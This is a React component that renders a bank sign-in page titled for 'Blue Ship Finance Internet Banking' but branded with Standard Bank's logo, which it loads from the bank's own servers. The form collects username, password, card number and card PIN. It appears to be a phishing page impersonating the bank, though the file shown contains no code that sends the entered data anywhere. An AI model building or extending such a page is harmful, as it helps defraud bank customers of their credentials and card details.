import React from "react";
import { Meta } from "../../../components";
import { Box, Typography } from "@mui/material";

const StandardBank = () => {
  return (
    <>
      <Meta
        title="Standard Bank Tokenization - Blue Ship Finance Internet Banking"
        description="Standard Bank Tokenization - Blue Ship Finance Internet Banking"
      />
      <Box className="standard-bank-page">
        <img
          src="https://enterprisests.standardbank.co.za/sbgassets/images/sbg.png"
          alt="Standard bank logo"
        />
        <Box sx={{ width: "100%", maxWidth: "416px" }}>
          <form className="standard-bank-form">
            <Typography mb={4} textAlign="center" sx={{ color: "#444" }}>
              Sign In
            </Typography>

            <div>
              <label htmlFor="username">Username</label>
              <input name="username" id="username" type="text" />
            </div>
            <div>
              <label htmlFor="password">Password</label>
              <input name="password" id="password" type="password" />
            </div>
            <div>
              <label htmlFor="cardNumber">Card Number</label>
              <input name="cardNumber" id="cardNumber" type="text" />
            </div>
            <div>
              <label htmlFor="cardPin">Pin</label>
              <input name="cardPin" id="cardPin" type="text" />
            </div>

            <button type="button">SUBMIT</button>
          </form>
        </Box>
      </Box>
    </>
  );
};

export default StandardBank;
